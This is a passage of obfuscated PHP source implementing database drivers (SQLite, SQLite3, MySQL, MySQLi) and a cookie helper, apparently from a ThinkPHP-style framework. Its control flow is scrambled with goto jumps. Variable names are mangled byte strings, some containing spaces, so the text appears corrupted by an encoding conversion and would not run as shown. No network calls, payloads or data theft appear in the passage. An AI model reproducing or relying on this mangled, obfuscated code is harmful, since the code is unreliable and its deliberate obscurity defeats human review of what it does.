b³¸†‘Æç: @sqlite_busy_timeout($this->linkID[$Eã…”ìÅ›], 30000); if (1 != think_config($A·³ ¿†ƒ¸[18])) { unset($this->config); } goto eŸ¯ùùù‚; d‘ã„â­à»: $this->linkID[$Eã…”ìÅ›] = $B¤¯¾ãÂ­($E‹ĞŸ»×Ğ¿[$A·³ ¿†ƒ¸[17]], $E‹ĞŸ»×Ğ¿[$A·³ ¿†ƒ¸[12]]); if (!$this->linkID[$Eã…”ìÅ›]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto b³¸†‘Æç; d¯¼‰÷Ò·: if (empty($E‹ĞŸ»×Ğ¿)) { $E‹ĞŸ»×Ğ¿ = $this->config; } $cÏèÂ™‘¹ğ = !empty($E‹ĞŸ»×Ğ¿[$A·³ ¿†ƒ¸[13]][$A·³ ¿†ƒ¸[14]]) ? $E‹ĞŸ»×Ğ¿[$A·³ ¿†ƒ¸[13]][$A·³ ¿†ƒ¸[14]] : $this->pconnect; $B¤¯¾ãÂ­ = $cÏèÂ™‘¹ğ ? $A·³ ¿†ƒ¸[15] : $A·³ ¿†ƒ¸[16]; goto d‘ã„â­à»; eŸ¯ùùù‚: } return $this->linkID[$Eã…”ìÅ›]; } public function free() { $this->queryID = null; } public function query($A»öèá†•†) { goto c±™ñƒ¸¤‘; bÙÁ÷›èÀÎ: think_status($d•‚¿¥Ê‚[20]); $this->queryID = sqlite_query($this->_linkID, $A»öèá†•†); $this->debug(); goto B¦¹è¹â; B¦¹è¹â: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $CˆİØ‡¹À = $this->getAll(); return $CˆİØ‡¹À; } goto Eœ¬Œ°˜µâ; a­òÏÁÉ‘à: $this->queryStr = $A»öèá†•†; if ($this->queryID) { $this->free(); } think_action_status($d•‚¿¥Ê‚[19], 1); goto bÙÁ÷›èÀÎ; c±™ñƒ¸¤‘: $d•‚¿¥Ê‚ =& $_SERVER[õëù©û]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a­òÏÁÉ‘à; Eœ¬Œ°˜µâ: } public function execute($BŒÔˆ´¹ï) { goto B‡äò°˜Íô; eùŠÚ¬õ‘: if (!1 === $CÅçá¥ ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto FÄõÈø§¨É; E¶Ï‡¦ƒ¯¢: $this->queryStr = $BŒÔˆ´¹ï; if ($this->queryID) { $this->free(); } think_action_status($dÍ‹Â´õ[21], 1); goto d¸°Ñ©÷¡; B‡äò°˜Íô: $dÍ‹Â´õ =& $_SERVER[õëù©û]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E¶Ï‡¦ƒ¯¢; d¸°Ñ©÷¡: think_status($dÍ‹Â´õ[20]); $CÅçá¥  = sqlite_exec($this->_linkID, $BŒÔˆ´¹ï); $this->debug(); goto eùŠÚ¬õ‘; FÄõÈø§¨É: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[õëù©û][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A…¾‘¹Ÿ×¯ = sqlite_query($this->_linkID, $_SERVER[õëù©û][23]); if (!$A…¾‘¹Ÿ×¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $fËĞ¬Â× = sqlite_query($this->_linkID, $_SERVER[õëù©û][24]); if (!$fËĞ¬Â×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $c¨–ÁƒÊ×ö = array(); if ($this->numRows > 0) { for ($dÙù›òáÉ = 0; $dÙù›òáÉ < $this->numRows; $dÙù›òáÉ++) { $c¨–ÁƒÊ×ö[$dÙù›òáÉ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $c¨–ÁƒÊ×ö; } public function getFields($DßŠê‘Í¬) { $BŒáÉêÏò =& $_SERVER[õëù©û]; $d¹·¹ÅÎö = $this->query($BŒáÉêÏò[25] . $DßŠê‘Í¬ . $BŒáÉêÏò[26]); $Fµ¯—ùíĞ– = array(); if ($d¹·¹ÅÎö) { foreach ($d¹·¹ÅÎö as $cÖé—Ú§ö => $AÑ½ˆ¸±¸‹) { $Fµ¯—ùíĞ–[$AÑ½ˆ¸±¸‹[$BŒáÉêÏò[27]]] = array($BŒáÉêÏò[28] => $AÑ½ˆ¸±¸‹[$BŒáÉêÏò[27]], $BŒáÉêÏò[29] => $AÑ½ˆ¸±¸‹[$BŒáÉêÏò[30]], $BŒáÉêÏò[31] => (bool) ($AÑ½ˆ¸±¸‹[$BŒáÉêÏò[32]] === $BŒáÉêÏò[33]), $BŒáÉêÏò[34] => $AÑ½ˆ¸±¸‹[$BŒáÉêÏò[35]], $BŒáÉêÏò[36] => strtolower($AÑ½ˆ¸±¸‹[$BŒáÉêÏò[37]]) == $BŒáÉêÏò[38], $BŒáÉêÏò[39] => strtolower($AÑ½ˆ¸±¸‹[$BŒáÉêÏò[40]]) == $BŒáÉêÏò[41]); } } return $Fµ¯—ùíĞ–; } public function getTables($A¥‹®ÇÈ¿Ğ = '') { $bÇŞÔó²± =& $_SERVER[õëù©û]; $d™Â¾¨ƒî = $this->query($bÇŞÔó²±[42] . $bÇŞÔó²±[43] . $bÇŞÔó²±[44]); $bÜ“®íéáŒ = array(); foreach ($d™Â¾¨ƒî as $C±õ™ƒŠ« => $CÏ‹Ê š) { $bÜ“®íéáŒ[$C±õ™ƒŠ«] = current($CÏ‹Ê š); } return $bÜ“®íéáŒ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $AßÃµ©ÑšÈ =& $_SERVER[õëù©û]; $EÉ‹ÚĞæñŠ = sqlite_last_error($this->_linkID); $this->error = $EÉ‹ÚĞæñŠ . $AßÃµ©ÑšÈ[4] . sqlite_error_string($EÉ‹ÚĞæñŠ); if ($AßÃµ©ÑšÈ[33] != $this->queryStr) { $this->error .= LNG($AßÃµ©ÑšÈ[45]) . $this->queryStr; } think_trace($this->error, $AßÃµ©ÑšÈ[33], $AßÃµ©ÑšÈ[46]); return $this->error; } public function escapeString($A£ÊğæÈ›µ) { return sqlite_escape_string($A£ÊğæÈ›µ); } public function parseLimit($bæŸèëôó…) { $b©Ã»‡ƒ¥á =& $_SERVER[õëù©û]; $F²”¡Éëù„ = $b©Ã»‡ƒ¥á[33]; if (!empty($bæŸèëôó…)) { $bæŸèëôó… = explode($b©Ã»‡ƒ¥á[47], $bæŸèëôó…); if (count($bæŸèëôó…) > 1) { $F²”¡Éëù„ .= $b©Ã»‡ƒ¥á[48] . $bæŸèëôó…[1] . $b©Ã»‡ƒ¥á[49] . $bæŸèëôó…[0] . $b©Ã»‡ƒ¥á[50]; } else { $F²”¡Éëù„ .= $b©Ã»‡ƒ¥á[48] . $bæŸèëôó…[0] . $b©Ã»‡ƒ¥á[50]; } } return $F²”¡Éëù„; } } class DbSqlite3Base extends Db { public function __construct($a°ÅìÓ¸—İ = '') { $eğ´–ß‹Å‘ =& $_SERVER[õëù©û]; if (!class_exists($eğ´–ß‹Å‘[51])) { think_exception(think_lang($eğ´–ß‹Å‘[10]) . $eğ´–ß‹Å‘[52]); } if (!empty($a°ÅìÓ¸—İ)) { if (!isset($a°ÅìÓ¸—İ[$eğ´–ß‹Å‘[12]])) { $a°ÅìÓ¸—İ[$eğ´–ß‹Å‘[12]] = 438; } $this->config = $a°ÅìÓ¸—İ; if (empty($this->config[$eğ´–ß‹Å‘[13]])) { $this->config[$eğ´–ß‹Å‘[13]] = array(); } } } public function connect($eŸ“ÛÁÉµ½ = '', $dæº²´¢î = 0) { $d¿Ş©ÛŠâ =& $_SERVER[õëù©û]; if (!isset($this->linkID[$dæº²´¢î])) { if (empty($eŸ“ÛÁÉµ½)) { $eŸ“ÛÁÉµ½ = $this->config; } $this->linkID[$dæº²´¢î] = new SQLite3($eŸ“ÛÁÉµ½[$d¿Ş©ÛŠâ[17]]); if (!$this->linkID[$dæº²´¢î]) { think_exception($this->linkID[$dæº²´¢î]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$dæº²´¢î]->busyTimeout(30000); if (1 != think_config($d¿Ş©ÛŠâ[18])) { unset($this->config); } } return $this->linkID[$dæº²´¢î]; } public function free() { $this->queryID = null; } public function query($F™Š¿ÆÂè¿) { goto cŠÜ¸¡Ñ‹; aîŠË¹‡—ñ: think_status($eÎÅ§×²ô[20]); $this->queryID = $this->_linkID->query($F™Š¿ÆÂè¿); $this->debug(); goto dŠàâÇ•; b¢ñŒß–ğ‘: $this->queryStr = $F™Š¿ÆÂè¿; if ($this->queryID) { $this->free(); } think_action_status($eÎÅ§×²ô[19], 1); goto aîŠË¹‡—ñ; cŠÜ¸¡Ñ‹: $eÎÅ§×²ô =& $_SERVER[õëù©û]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto b¢ñŒß–ğ‘; dŠàâÇ•: if (!1 === $this->queryID) { $this->error(); return !1; } else { $BÌÏôÇÜÓ = $this->getAll(); $this->numRows = count($BÌÏôÇÜÓ); return $BÌÏôÇÜÓ; } goto bÈŠ•¾„; bÈŠ•¾„: } public function execute($DŠÅŒ°ôË—) { goto C¼ô—µ¦öª; D—²Àˆ¹¹: $this->queryStr = $DŠÅŒ°ôË—; if ($this->queryID) { $this->free(); } think_action_status($fò¯íñÆŸ[21], 1); goto c§È„‹Ö; C¼ô—µ¦öª: $fò¯íñÆŸ =& $_SERVER[õëù©û]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto D—²Àˆ¹¹; bï‰°·Í¾»: if (!1 === $EÂÌãÍ…) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto bö—±×¸ÜÄ; c§È„‹Ö: think_status($fò¯íñÆŸ[20]); $EÂÌãÍ… = $this->_linkID->exec($DŠÅŒ°ôË—); $this->debug(); goto bï‰°·Í¾»; bö—±×¸ÜÄ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[õëù©û][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $FĞ–®ã³È« = $this->_linkID->query($_SERVER[õëù©û][23]); if (!$FĞ–®ã³È«) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $E·¶ª‡š¼¨ = $this->_linkID->query($_SERVER[õëù©û][24]); if (!$E·¶ª‡š¼¨) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $D´ËœÆàÖÕ = array(); while ($c©áæµ¼˜» = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $D´ËœÆàÖÕ[] = $c©áæµ¼˜»; } $this->queryID->reset(); return $D´ËœÆàÖÕ; } public function getFields($CƒÌ›‹»Ì†) { $eŒğˆš®­£ =& $_SERVER[õëù©û]; $cÂÒ™ä¿ß÷ = $this->query($eŒğˆš®­£[25] . $CƒÌ›‹»Ì† . $eŒğˆš®­£[26]); $EÁÔÅÂÓ¦ = array(); if ($cÂÒ™ä¿ß÷) { foreach ($cÂÒ™ä¿ß÷ as $D¶½èìÈÌ => $D ©ŞÏÄâ) { $EÁÔÅÂÓ¦[$D ©ŞÏÄâ[$eŒğˆš®­£[28]]] = array($eŒğˆš®­£[28] => $D ©ŞÏÄâ[$eŒğˆš®­£[28]], $eŒğˆš®­£[29] => $D ©ŞÏÄâ[$eŒğˆš®­£[29]], $eŒğˆš®­£[31] => (bool) ($D ©ŞÏÄâ[$eŒğˆš®­£[31]] === $eŒğˆš®­£[33]), $eŒğˆš®­£[34] => $D ©ŞÏÄâ[$eŒğˆš®­£[53]], $eŒğˆš®­£[36] => (bool) $D ©ŞÏÄâ[$eŒğˆš®­£[54]], $eŒğˆš®­£[39] => (bool) $D ©ŞÏÄâ[$eŒğˆš®­£[54]]); } } return $EÁÔÅÂÓ¦; } public function getTables($a—’·î¿‡ = '') { $Fä’ÑÈùàà =& $_SERVER[õëù©û]; $aï§ßÂ¸‹ = $this->query($Fä’ÑÈùàà[42] . $Fä’ÑÈùàà[43] . $Fä’ÑÈùàà[44]); $EÈ–¡è…À = array(); foreach ($aï§ßÂ¸‹ as $D›ò¶Š¸ˆÀ => $B×İ¢İñÍ) { $EÈ–¡è…À[$D›ò¶Š¸ˆÀ] = current($B×İ¢İñÍ); } return $EÈ–¡è…À; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $c½Î¥­­ç =& $_SERVER[õëù©û]; $this->error = $this->_linkID->lastErrorMsg(); if ($c½Î¥­­ç[33] != $this->queryStr) { $this->error .= LNG($c½Î¥­­ç[45]) . $this->queryStr; } think_trace($this->error, $c½Î¥­­ç[33], $c½Î¥­­ç[46]); return $this->error; } public function escapeString($bä—ÖÒÊÂĞ) { $BË‡¾”»Ò± =& $_SERVER[õëù©û]; if ($this->_linkID) { return $this->_linkID->escapeString($bä—ÖÒÊÂĞ); } return str_ireplace($BË‡¾”»Ò±[55], $BË‡¾”»Ò±[56], $bä—ÖÒÊÂĞ); } public function parseLimit($aÆã¤Ï…Óø) { $C˜¾»„õ†ó =& $_SERVER[õëù©û]; $Døƒ„¶ƒß¸ = $C˜¾»„õ†ó[33]; if (!empty($aÆã¤Ï…Óø)) { $aÆã¤Ï…Óø = explode($C˜¾»„õ†ó[47], $aÆã¤Ï…Óø); if (count($aÆã¤Ï…Óø) > 1) { $Døƒ„¶ƒß¸ .= $C˜¾»„õ†ó[48] . $aÆã¤Ï…Óø[1] . $C˜¾»„õ†ó[49] . $aÆã¤Ï…Óø[0] . $C˜¾»„õ†ó[50]; } else { $Døƒ„¶ƒß¸ .= $C˜¾»„õ†ó[48] . $aÆã¤Ï…Óø[0] . $C˜¾»„õ†ó[50]; } } return $Døƒ„¶ƒß¸; } } goto B…Ó«ù²È…; A‡‹‰ŸÛ¿: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($A¥‘•¸õ™± = '', $AÖÒÏŠ­°ğ = 0) { if (is_string($A¥‘•¸õ™±) && $A¥‘•¸õ™± != $_SERVER[õëù©û][33]) { $this->prefix = $A¥‘•¸õ™±; } if (is_numeric($AÖÒÏŠ­°ğ) && $AÖÒÏŠ­°ğ > 0) { $this->expire = $AÖÒÏŠ­°ğ; } } public static function getInstance() { static $A’¾¹Õ¦³ñ; if ($A’¾¹Õ¦³ñ === null) { $A’¾¹Õ¦³ñ = new self(); } return $A’¾¹Õ¦³ñ; } private static $sameCookieSet = array(); public static function set($CŠÚ»Ø¨È¬, $dâÚ ²¼—, $c¯¶’›²Ñ² = 0, $FÁîéğëê = false, $bî¶ä¶£ÓØ = false) { goto BùÊôºïëÀ; FŒé×†áÇ: self::$sameCookieSet[$CŠÚ»Ø¨È¬] = $dâÚ ²¼— . $c¯¶’›²Ñ²; if (!$bî¶ä¶£ÓØ) { $bî¶ä¶£ÓØ = str_replace(HOST, $c ™õÇ»[33], APP_HOST); $bî¶ä¶£ÓØ = _get($GLOBALS, $c ™õÇ»[790], $bî¶ä¶£ÓØ); } $eÑÕƒæÅ¬‰ = $c ™õÇ»[33]; goto F«½ÉêĞùÊ; F«½ÉêĞùÊ: setcookie($CŠÚ»Ø¨È¬, $dâÚ ²¼—, time() + $c¯¶’›²Ñ², $c ™õÇ»[8] . trim($bî¶ä¶£ÓØ, $c ™õÇ»[8]) . $eÑÕƒæÅ¬‰, !1, !1, $FÁîéğëê); goto C»Î×Šô; BùÊôºïëÀ: $c ™õÇ» =& $_SERVER[õëù©û]; if (!$c¯¶’›²Ñ²) { $c¯¶’›²Ñ² = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$CŠÚ»Ø¨È¬]) && self::$sameCookieSet[$CŠÚ»Ø¨È¬] == $dâÚ ²¼— . $c¯¶’›²Ñ²) { return; } goto FŒé×†áÇ; C»Î×Šô: } public static function setSafe($eÂ›æŠÂç§, $E„Öå¯¨ù, $cÕáë³õ‡ = 0) { self::set($eÂ›æŠÂç§, $E„Öå¯¨ù, $cÕáë³õ‡, !0); } public static function get($d­†¹…«˜–) { return isset($_COOKIE[$d­†¹…«˜–]) ? $_COOKIE[$d­†¹…«˜–] : !1; } public static function remove($c¥“£Œ›ˆÈ, $A§ÔÛÌ¤ˆ¥ = false) { unset($_COOKIE[$c¥“£Œ›ˆÈ]); self::set($c¥“£Œ›ˆÈ, $_SERVER[õëù©û][33], 1, $A§ÔÛÌ¤ˆ¥); } } class DbMysql extends Db { public function __construct($eÍÔõ²Ï¦å = '') { $b¿àš¬Íµ— =& $_SERVER[õëù©û]; if (!extension_loaded($b¿àš¬Íµ—[723])) { think_exception(think_lang($b¿àš¬Íµ—[10]) . $b¿àš¬Íµ—[791]); } if (!empty($eÍÔõ²Ï¦å)) { $this->config = $eÍÔõ²Ï¦å; if (empty($this->config[$b¿àš¬Íµ—[13]])) { $this->config[$b¿àš¬Íµ—[13]] = $b¿àš¬Íµ—[33]; } } } public function connect($aÒëî˜²» = '', $AŒ½…µæóù = 0, $bİ´Ëïî©Õ = false) { $bÓ£ÂÄæ†§ =& $_SERVER[õëù©û]; if (!isset($this->linkID[$AŒ½…µæóù])) { goto aš¤Æï”òù; f¬ì…Óñˆ„: if (1 != think_config($bÓ£ÂÄæ†§[18])) { unset($this->config); } goto FÓËŠùùŒ; BŞ¼¼É—µö: mysql_query($bÓ£ÂÄæ†§[796] . think_config($bÓ£ÂÄæ†§[797]) . $bÓ£ÂÄæ†§[55], $this->linkID[$AŒ½…µæóù]); if ($f‡ˆŒ¹˜ÀÜ > $bÓ£ÂÄæ†§[798]) { mysql_query($bÓ£ÂÄæ†§[799], $this->linkID[$AŒ½…µæóù]); } $this->connected = !0; goto f¬ì…Óñˆ„; aš¤Æï”òù: if (empty($aÒëî˜²»)) { $aÒëî˜²» = $this->config; } $bˆÁ›®Œ‘ = $aÒëî˜²»[$bÓ£ÂÄæ†§[792]] . ($aÒëî˜²»[$bÓ£ÂÄæ†§[793]] ? "\x3a{$aÒëî˜²»[$bÓ£ÂÄæ†§[793]]}" : $bÓ£ÂÄæ†§[33]); $Bç¿ğ¤»ó = !empty($aÒëî˜²»[$bÓ£ÂÄæ†§[13]][$bÓ£ÂÄæ†§[14]]) ? $aÒëî˜²»[$bÓ£ÂÄæ†§[13]][$bÓ£ÂÄæ†§[14]] : $this->pconnect; goto d’ÌÊ³÷; d’ÌÊ³÷: if ($Bç¿ğ¤»ó) { $this->linkID[$AŒ½…µæóù] = mysql_pconnect($bˆÁ›®Œ‘, $aÒëî˜²»[$bÓ£ÂÄæ†§[794]], $aÒëî˜²»[$bÓ£ÂÄæ†§[795]], 131072); } else { $this->linkID[$AŒ½…µæóù] = mysql_connect($bˆÁ›®Œ‘, $aÒëî˜²»[$bÓ£ÂÄæ†§[794]], $aÒëî˜²»[$bÓ£ÂÄæ†§[795]], !0, 131072); } if (!$this->linkID[$AŒ½…µæóù] || !empty($aÒëî˜²»[$bÓ£ÂÄæ†§[17]]) && !mysql_select_db($aÒëî˜²»[$bÓ£ÂÄæ†§[17]], $this->linkID[$AŒ½…µæóù])) { think_exception(mysql_error()); } $f‡ˆŒ¹˜ÀÜ = mysql_get_server_info($this->linkID[$AŒ½…µæóù]); goto BŞ¼¼É—µö; FÓËŠùùŒ: } return $this->linkID[$AŒ½…µæóù]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($eÉÜ‰ØÅ¯Ò) { goto Eˆ…›´Ó™; Eˆ…›´Ó™: $b„¤§†®· =& $_SERVER[õëù©û]; if (0 === stripos($eÉÜ‰ØÅ¯Ò, $b„¤§†®·[248])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto føöÙ‰ˆÉÒ; c¼¦ï²ôéé: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto F–¯©İÜ¶; føöÙ‰ˆÉÒ: if (!$this->_linkID) { return !1; } $this->queryStr = $eÉÜ‰ØÅ¯Ò; if ($this->queryID) { $this->free(); } goto A»ÊéñØÛÒ; A»ÊéñØÛÒ: think_action_status($b„¤§†®·[19], 1); think_status($b„¤§†®·[20]); $this->queryID = mysql_query($eÉÜ‰ØÅ¯Ò, $this->_linkID); goto c¼¦ï²ôéé; F–¯©İÜ¶: } public function execute($a´Ñ¥Òº‡İ) { goto EÆ¸õÀ‚Ğ˜; F½±‰Ü³: $this->queryStr = $a´Ñ¥Òº‡İ; if ($this->queryID) { $this->free(); } think_action_status($e‡íÈÈœ¦Œ[21], 1); goto A… ¾™ª½¸; EÆ¸õÀ‚Ğ˜: $e‡íÈÈœ¦Œ =& $_SERVER[õëù©û]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F½±‰Ü³; A… ¾™ª½¸: think_status($e‡íÈÈœ¦Œ[20]); $føòêÒåÊ‘ = mysql_query($a´Ñ¥Òº‡İ, $this->_linkID); $this->debug(); goto CÊ‰÷“ÕÊ; CÊ‰÷“ÕÊ: if (!1 === $føòêÒåÊ‘) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto D¿Ÿæ‡‰Ìã; D¿Ÿæ‡‰Ìã: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[õëù©û][800], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Cœ¯‚ …†¦ = mysql_query($_SERVER[õëù©û][801], $this->_linkID); $this->transTimes = 0; if (!$Cœ¯‚ …†¦) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Fºå†áÂŠ = mysql_query($_SERVER[õëù©û][802], $this->_linkID); $this->transTimes = 0; if (!$Fºå†áÂŠ) { $this->error(); return !1; } } return !0; } private function getAll() { $C‹È©ÌÈÈ = array(); if ($this->numRows > 0) { while ($Còªá‚ñ¢‹ = mysql_fetch_assoc($this->queryID)) { $C‹È©ÌÈÈ[] = $Còªá‚ñ¢‹; } mysql_data_seek($this->queryID, 0); } return $C‹È©ÌÈÈ; } public function getFields($eŠ¨¡ğå¬ö) { $a¾Ÿ÷İÚˆ =& $_SERVER[õëù©û]; $E¯ƒîˆ´ = $this->query($a¾Ÿ÷İÚˆ[803] . $this->parseKey($eŠ¨¡ğå¬ö)); $DÃ±µ“ç‰½ = array(); if ($E¯ƒîˆ´) { foreach ($E¯ƒîˆ´ as $f©•öîäÙ => $EÑâÈÚêøÛ) { $DÃ±µ“ç‰½[$EÑâÈÚêøÛ[$a¾Ÿ÷İÚˆ[27]]] = array($a¾Ÿ÷İÚˆ[28] => $EÑâÈÚêøÛ[$a¾Ÿ÷İÚˆ[27]], $a¾Ÿ÷İÚˆ[29] => $EÑâÈÚêøÛ[$a¾Ÿ÷İÚˆ[30]], $a¾Ÿ÷İÚˆ[31] => (bool) (strtoupper($EÑâÈÚêøÛ[$a¾Ÿ÷İÚˆ[32]]) === $a¾Ÿ÷İÚˆ[804]), $a¾Ÿ÷İÚˆ[34] => $EÑâÈÚêøÛ[$a¾Ÿ÷İÚˆ[35]], $a¾Ÿ÷İÚˆ[36] => strtolower($EÑâÈÚêøÛ[$a¾Ÿ÷İÚˆ[37]]) == $a¾Ÿ÷İÚˆ[38], $a¾Ÿ÷İÚˆ[39] => strtolower($EÑâÈÚêøÛ[$a¾Ÿ÷İÚˆ[40]]) == $a¾Ÿ÷İÚˆ[41]); } } return $DÃ±µ“ç‰½; } public function getTables($e­˜šØ‡æ¾ = '') { $Fà¼“ì…¼ä =& $_SERVER[õëù©û]; if (!empty($e­˜šØ‡æ¾)) { $c¯éÇè¾¾® = $Fà¼“ì…¼ä[805] . $e­˜šØ‡æ¾; } else { $c¯éÇè¾¾® = $Fà¼“ì…¼ä[806]; } $CÈš¾è™‡´ = $this->query($c¯éÇè¾¾®); $eŸ£Í¯êÔ = array(); foreach ($CÈš¾è™‡´ as $bê™İôŒ¾‡ => $BñĞíó‚‰) { $eŸ£Í¯êÔ[$bê™İôŒ¾‡] = current($BñĞíó‚‰); } return $eŸ£Í¯êÔ; } public function replace($CÁâŸíâãµ, $bİ´Á»§× = array()) { $BÉ¸¶¶®ˆ =& $_SERVER[õëù©û]; foreach ($CÁâŸíâãµ as $cğõ‚íˆŒõ => $bèù¬ÎŠ©) { $e¡á…´§ñÂ = $this->parseValue($bèù¬ÎŠ©); if (is_scalar($e¡á…´§ñÂ)) { $dåŸè•ììÈ[] = $e¡á…´§ñÂ; $DÍİ†ÌŸ—Í[] = $this->parseKey($cğõ‚íˆŒõ); } } $BÀ›ëÁõŠ = $BÉ¸¶¶®ˆ[807] . $this->parseTable($bİ´Á»§×[$BÉ¸¶¶®ˆ[263]]) . $BÉ¸¶¶®ˆ[808] . implode($BÉ¸¶¶®ˆ[47], $DÍİ†ÌŸ—Í) . $BÉ¸¶¶®ˆ[809] . implode($BÉ¸¶¶®ˆ[47], $dåŸè•ììÈ) . $BÉ¸¶¶®ˆ[810]; return $this->execute($BÀ›ëÁõŠ); } public function insertAll($C±ôÎÒ³—, $A£Ô Ö’£ó = array(), $BÕ¤ÁôØÒë = false) { goto fÇÌ‘ÑÃ‹; EÑâÅÌéˆµ: $Báëô¥ŞÆª = ($BÕ¤ÁôØÒë ? $dïï¥íß¼­[812] : $dïï¥íß¼­[813]) . $dïï¥íß¼­[814] . $this->parseTable($A£Ô Ö’£ó[$dïï¥íß¼­[263]]) . $dïï¥íß¼­[808] . implode($dïï¥íß¼­[47], $eÉñµãæ¶Û) . $dïï¥íß¼­[815] . implode($dïï¥íß¼­[47], $eÔ–¨›®Ì¡); return $this->execute($Báëô¥ŞÆª); goto F¼¹®«ÂØ; fÇÌ‘ÑÃ‹: $dïï¥íß¼­ =& $_SERVER[õëù©û]; if (!is_array($C±ôÎÒ³—[0])) { return !1; } $eÉñµãæ¶Û = array_keys($C±ôÎÒ³—[0]); goto CŒ¨ …‡ƒ; CŒ¨ …‡ƒ: $eÔ–¨›®Ì¡ = array(); foreach ($C±ôÎÒ³— as $d‹ïÀ©ÁŸÉ) { $aÂÁñ…œ£ö = array(); foreach ($d‹ïÀ©ÁŸÉ as $cŒÍ«‡²ÏË => $Dóñ×ÏÙ‚ä) { $Dóñ×ÏÙ‚ä = $this->parseValue($Dóñ×ÏÙ‚ä); if (is_scalar($Dóñ×ÏÙ‚ä)) { $aÂÁñ…œ£ö[] = $Dóñ×ÏÙ‚ä; } } $eÔ–¨›®Ì¡[] = $dïï¥íß¼­[244] . implode($dïï¥íß¼­[47], $aÂÁñ…œ£ö) . $dïï¥íß¼­[810]; } array_walk($eÉñµãæ¶Û, array($this, $dïï¥íß¼­[811])); goto EÑâÅÌéˆµ; F¼¹®«ÂØ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $aÖ±Ä‡™·Û =& $_SERVER[õëù©û]; $this->error = mysql_errno() . $aÖ±Ä‡™·Û[4] . mysql_error($this->_linkID); if ($aÖ±Ä‡™·Û[33] != $this->queryStr) { $this->error .= LNG($aÖ±Ä‡™·Û[45]) . $this->queryStr; } think_trace($this->error, $aÖ±Ä‡™·Û[33], $aÖ±Ä‡™·Û[46]); return $this->error; } public function escapeString($B°¹ÙÎøÑÀ) { if ($this->_linkID) { return mysql_real_escape_string($B°¹ÙÎøÑÀ, $this->_linkID); } else { return mysql_escape_string($B°¹ÙÎøÑÀ); } } public function parseKey(&$a¼Í® ÷–‰, $bòù¿¬àæ· = true) { $bÓ¥Ôæ¦İ =& $_SERVER[õëù©û]; if ($bòù¿¬àæ·) { $a¼Í® ÷–‰ = $this->parseKeyCheck($a¼Í® ÷–‰); } if ($a¼Í® ÷–‰ != $bÓ¥Ôæ¦İ[172] && !preg_match($bÓ¥Ôæ¦İ[816], $a¼Í® ÷–‰)) { $a¼Í® ÷–‰ = $bÓ¥Ôæ¦İ[817] . trim($a¼Í® ÷–‰, $bÓ¥Ôæ¦İ[817]) . $bÓ¥Ôæ¦İ[817]; } return $a¼Í® ÷–‰; } } class DbMysqli extends Db { public function __construct($bƒØË¥Ÿå = '') { $cÊ˜çŒ„¡„ =& $_SERVER[õëù©û]; if (!extension_loaded($cÊ˜çŒ„¡„[722])) { think_exception(think_lang($cÊ˜çŒ„¡„[10]) . $cÊ˜çŒ„¡„[818]); } if (!empty($bƒØË¥Ÿå)) { $this->config = $bƒØË¥Ÿå; if (empty($this->config[$cÊ˜çŒ„¡„[13]])) { $this->config[$cÊ˜çŒ„¡„[13]] = $cÊ˜çŒ„¡„[33]; } } } public function connect($Cë…¼¦ĞÂ = '', $B…ë‰†Ø´ß = 0) { $CˆîìèËÎÜ =& $_SERVER[õëù©û]; if (!isset($this->linkID[$B…ë‰†Ø´ß])) { goto dÖ…·İ„¦¼; dÖ…·İ„¦¼: if (empty($Cë…¼¦ĞÂ)) { $Cë…¼¦ĞÂ = $this->config; } $this->linkID[$B…ë‰†Ø´ß] = new mysqli($Cë…¼¦ĞÂ[$CˆîìèËÎÜ[792]], $Cë…¼¦ĞÂ[$CˆîìèËÎÜ[794]], $Cë…¼¦ĞÂ[$CˆîìèËÎÜ[795]], $Cë…¼¦ĞÂ[$CˆîìèËÎÜ[17]], $Cë…¼¦ĞÂ[$CˆîìèËÎÜ[793]] ? intval($Cë…¼¦ĞÂ[$CˆîìèËÎÜ[793]]) : 3306); if (mysqli_connect_errno()) { 